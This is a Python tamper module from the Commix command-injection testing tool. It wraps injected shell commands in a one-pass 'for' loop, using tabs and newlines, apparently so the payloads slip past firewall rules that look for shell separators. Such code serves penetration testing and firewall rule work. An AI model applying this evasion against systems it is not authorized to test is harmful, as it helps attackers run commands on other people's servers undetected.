#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.core.parse import cmdline as menu
from src.utils import settings
from src.core.controller import checks

"""
About: Wraps the payload's command in a single-iteration "for" loop, so it is reached through a shell keyword instead of a separator.
Notes: This tamper script works against target(s) with a POSIX shell.
Reference: https://github.com/coreruleset/coreruleset/issues/4789
"""

__tamper__ = "cmd2loop"
__priority__ = settings.PRIORITY.LOW

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_eval_incompatible(__tamper__) or checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Longest first, so "&&" is not read as "&" and "\r\n" not as "\n".
_SEPARATORS = sorted([_sep for _sep in settings.SEPARATORS_LVL1 if _sep], key=len, reverse=True)

"""
A tab, not a space, separates the loop's keywords.

Whitespace substitution can rewrite spaces in the payload, preventing the shell from correctly parsing the loop. 
A tab is recognized directly as parser whitespace and remains unaffected, preserving the loop structure.
"""
_KEYWORD_WHITESPACE = "\t"

# The payloads already spend the first three of these, and a loop must not shadow a variable whose
# value the body it wraps is about to read.
_LOOP_VARIABLE = settings.RANDOM_VAR_GENERATOR + "3"

"""
Where the injected command starts, not where the payload starts.

The prefix is added before tampering, so only the injected command should be wrapped. 
Including the prefix can break the command structure it was intended to close.
"""
def _boundary(payload):
  for index in range(len(payload)):
    for sep in _SEPARATORS:
      if payload.startswith(sep, index):
        return index + len(sep)
  return -1

"""
The comment that terminates an out-of-band payload must remain at the end of the line.

It prevents trailing input from being interpreted as part of the command. 
Anything placed after it can break the command structure and prevent execution.
"""
def _split_comment(body):
  if not body.endswith(settings.COMMENT):
    return body, ""
  body = body[:len(body) - len(settings.COMMENT)]
  # Whitespace substitution has already run, so the space before it is whatever is now in use.
  space = settings.WHITESPACES[0] if settings.WHITESPACES else settings.SINGLE_WHITESPACE
  if body.endswith(space):
    body = body[:len(body) - len(space)]
  # It goes back after a tab: "done" must remain a separate keyword for the loop to parse correctly.
  return body, _KEYWORD_WHITESPACE + settings.COMMENT

# Everything glued on after the command comes off in the order it went on, and goes back the same.
def _split(payload):
  cut = _boundary(payload)
  if cut < 0:
    return None
  head, body = payload[:cut], payload[cut:]

  suffix = menu.options.suffix if menu.options.suffix and body.endswith(menu.options.suffix) else ""
  if suffix:
    body = body[:len(body) - len(suffix)]
  body, comment = _split_comment(body)
  sep = next((_sep for _sep in _SEPARATORS if body.endswith(_sep)), "")
  if sep:
    body = body[:len(body) - len(sep)]
  return head, body, sep + comment + suffix

# A header value cannot carry a raw newline, so the connective the loop needs is unavailable there.
def _header_injection():
  return settings.USER_AGENT_INJECTION or settings.REFERER_INJECTION or \
         settings.HOST_INJECTION or settings.CUSTOM_HEADER_INJECTION

"""
A Windows command payload, identified from the payload itself.

The operating system may be unknown when the payload is processed, so relying on fingerprinting can lead to incorrect handling. 
Identifying the payload directly ensures the appropriate command structure is preserved.
"""
def _windows_shaped(payload):
  return checks.WINDOWS_TAIL.strip() in payload

"""
Blank out quoted spans, keeping the length so the rest still lines up.

A ";" inside an interpreter's own program text is that language's statement separator, not the
shell's, and reading it as one would refuse payloads that are a single command from the shell's
point of view - the out-of-band Python client being the one that does this.
"""
def _outside_quotes(body):
  out = []
  quote = ""
  index = 0
  while index < len(body):
    char = body[index]
    if quote:
      out.append(settings.SINGLE_WHITESPACE)
      if char == "\\" and index + 1 < len(body):
        out.append(settings.SINGLE_WHITESPACE)
        index += 1
      elif char == quote:
        quote = ""
    elif char in "'\"":
      quote = char
      out.append(settings.SINGLE_WHITESPACE)
    else:
      out.append(char)
    index += 1
  # An unbalanced quote means the read was wrong, so nothing it says can be relied on.
  return body if quote else "".join(out)

"""
A payload that chains using the separator under test can be wrapped.

When a payload uses the same separator consistently, its steps can be grouped without changing the command flow. 
Payloads that test multiple separators represent alternatives rather than a single sequence, so they should remain unchanged.
"""
def _one_chain(head, body):
  chained = next((sep for sep in _SEPARATORS if head.endswith(sep)), "")
  body = _outside_quotes(body)
  index = 0
  while index < len(body):
    found = next((sep for sep in _SEPARATORS if body.startswith(sep, index)), "")
    if not found:
      index += 1
    elif found == chained:
      index += len(found)
    else:
      return False
  return True

"""
Newlines, not semicolons, connect the loop.

A semicolon can introduce an unnecessary separator, while the command after `do` 
provides a clean execution point without an additional metacharacter.
"""
def tamper(payload):
  if settings.TARGET_OS == settings.OS.WINDOWS or _header_injection():
    return payload

  if _windows_shaped(payload):
    return payload

  parts = _split(payload)
  if parts is None:
    return payload
  head, body, tail = parts
  # A carriage return is not whitespace to a POSIX shell; it would be swallowed into a word.
  if not body.strip() or settings.END_LINE.CR in body or not _one_chain(head, body):
    return payload

  lf, ws = settings.END_LINE.LF, _KEYWORD_WHITESPACE
  loop = ws.join(["for", _LOOP_VARIABLE, "in", "1"]) + \
         lf + "do" + ws + body + lf + "done"
  return head + loop + tail

# eof
